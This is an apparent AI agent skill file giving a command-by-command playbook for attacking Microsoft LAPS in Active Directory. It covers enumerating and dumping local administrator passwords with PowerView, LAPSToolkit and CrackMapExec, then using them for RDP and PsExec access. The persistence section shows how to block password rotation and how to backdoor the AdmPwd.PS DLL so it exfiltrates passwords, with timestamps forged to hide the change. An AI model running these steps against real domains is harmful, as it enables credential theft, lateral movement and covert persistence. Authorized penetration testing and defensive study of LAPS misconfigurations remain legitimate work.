---
name: active-directory-laps
description: Use this skill whenever you need to enumerate, read, or exploit LAPS (Local Administrator Password Solution) in Active Directory environments. Trigger when the user mentions LAPS, local admin passwords, AD computer objects, ms-mcs-AdmPwd, LAPS password enumeration, or any AD password management scenario. This skill covers checking LAPS status, reading LAPS passwords, finding delegated permissions, and persistence techniques.
---

# Active Directory LAPS Enumeration and Exploitation

A comprehensive guide for enumerating and exploiting Microsoft's Local Administrator Password Solution (LAPS) in Active Directory environments.

## What is LAPS?

LAPS manages local administrator passwords on domain-joined computers by:
- Generating **unique, randomized passwords** for each machine
- **Frequently rotating** these passwords
- Storing them securely in Active Directory attributes
- Restricting access via Access Control Lists (ACLs)

### Key AD Attributes

| Attribute | Purpose |
|-----------|----------|
| `ms-mcs-AdmPwd` | Stores the plain-text administrator password |
| `ms-mcs-AdmPwdExpirationTime` | Stores the password expiration timestamp |

---

## 1. Check if LAPS is Enabled

### Registry Check
```powershell
reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled
```

### File System Check
```powershell
dir "C:\Program Files\LAPS\CSE"
# Look for AdmPwd.dll in this folder
```

### Find LAPS GPOs
```powershell
Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl
```

### Find Computers with LAPS Enabled
```powershell
# Any Domain User can read this property
Get-DomainObject -SearchBase "LDAP://DC=sub,DC=domain,DC=local" | 
  ? { $_."ms-mcs-admpwdexpirationtime" -ne $null } | 
  select DnsHostname
```

---

## 2. Enumerate LAPS Password Access

### Parse Registry Policy Files
Download the raw LAPS policy and parse it:
```powershell
# Download from DC
\dc\SysVol\domain\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol

# Parse with GPRegistryPolicyParser
Parse-PolFile -Path ".\Registry.pol"
```

### Native LAPS PowerShell Cmdlets
```powershell
# List available cmdlets
Get-Command *AdmPwd*

# Find who can read LAPS passwords for an OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Read a specific computer's LAPS password
Get-AdmPwdPassword -ComputerName wkstn-2 | fl
```

### Using PowerView
```powershell
# Find principals with ReadProperty on ms-Mcs-AdmPwd
Get-DomainObject -Identity wkstn-2 -Properties ms-Mcs-AdmPwd

# Read the password directly
Get-DomainObject -Identity wkstn-2 -Properties ms-Mcs-AdmPwd | 
  Select-Object -ExpandProperty ms-Mcs-AdmPwd
```

---

## 3. LAPSToolkit Enumeration

The [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) provides advanced enumeration:

### Find Delegated Groups
```powershell
# Get groups that can read LAPS passwords
Find-LAPSDelegatedGroups

# Output example:
# OrgUnit                                           Delegated Groups
# -------                                           ----------------
# OU=Servers,DC=DOMAIN_NAME,DC=LOCAL                DOMAIN_NAME\Domain Admins
# OU=Workstations,DC=DOMAIN_NAME,DC=LOCAL           DOMAIN_NAME\LAPS Admin
```

### Find Extended Rights
```powershell
# Check rights on each LAPS-enabled computer
Find-AdmPwdExtendedRights

# Output example:
# ComputerName                Identity                    Reason
# ------------                --------                    ------
# MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\Domain Admins   Delegated
# MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\LAPS Admins     Delegated
```

### Get LAPS Passwords
```powershell
# Get computers with LAPS enabled, expiration time, and passwords
Get-LAPSComputers

# Output example:
# ComputerName                Password       Expiration
# ------------                --------       ----------
# DC01.DOMAIN_NAME.LOCAL      j&gR+A(s976Rf% 12/10/2022 13:24:41
```

---

## 4. Remote LAPS Dumping with CrackMapExec

If you don't have PowerShell access, use CrackMapExec over LDAP:

```bash
crackmapexec ldap 10.10.10.10 -u user -p password --kdcHost 10.10.10.10 -M laps
```

This dumps all LAPS passwords the authenticated user can read.

---

## 5. Using LAPS Passwords

### Remote Desktop
```bash
xfreerdp /v:192.168.1.1:3389 /u:Administrator
# Password: [LAPS password from enumeration]
```

### PsExec
```bash
python psexec.py Administrator@web.example.com
# Password: [LAPS password from enumeration]
```

---

## 6. LAPS Persistence Techniques

### Extend Password Expiration
Once you have admin access, prevent password rotation:

```powershell
# Get current expiration time
Get-DomainObject -Identity computer-21 -Properties ms-mcs-admpwdexpirationtime

# Set expiration far in the future (requires SYSTEM on the computer)
Set-DomainObject -Identity wkstn-2 -Set @{"ms-mcs-admpwdexpirationtime"="232609935231523081"}
```

> **Warning**: Passwords will still reset if:
> - An admin uses `Reset-AdmPwdPassword` cmdlet
> - "Do not allow password expiration time longer than required by policy" is enabled in LAPS GPO

### Backdoor the LAPS Module

1. Download the [LAPS source code](https://github.com/GreyCorbel/admpwd)
2. Modify `Main/AdmPwd.PS/Main.cs` in the `Get-AdmPwdPassword` method to:
   - Exfiltrate new passwords
   - Store them in a hidden location
3. Compile the modified `AdmPwd.PS.dll`
4. Upload to target: `C:\Tools\admpwd\Main\AdmPwd.PS\bin\Debug\AdmPwd.PS.dll`
5. Change the file modification time to match the original

---

## Quick Reference

| Task | Command |
|------|----------|
| Check LAPS enabled | `reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled` |
| Find LAPS computers | `Get-DomainObject | ? { $_."ms-mcs-admpwdexpirationtime" -ne $null }` |
| Read LAPS password | `Get-AdmPwdPassword -ComputerName <hostname>` |
| Find delegated groups | `Find-LAPSDelegatedGroups` |
| Remote dump | `crackmapexec ldap <dc> -u <user> -p <pass> -M laps` |
| Extend expiration | `Set-DomainObject -Identity <host> -Set @{"ms-mcs-admpwdexpirationtime"="<future_timestamp>"}` |

---

## References

- [Introduction to Microsoft LAPS](https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/)
- [LAPSToolkit GitHub](https://github.com/leoloobeek/LAPSToolkit)
- [LAPS Source Code](https://github.com/GreyCorbel/admpwd)
- [GPRegistryPolicyParser](https://github.com/PowerShell/GPRegistryPolicyParser)
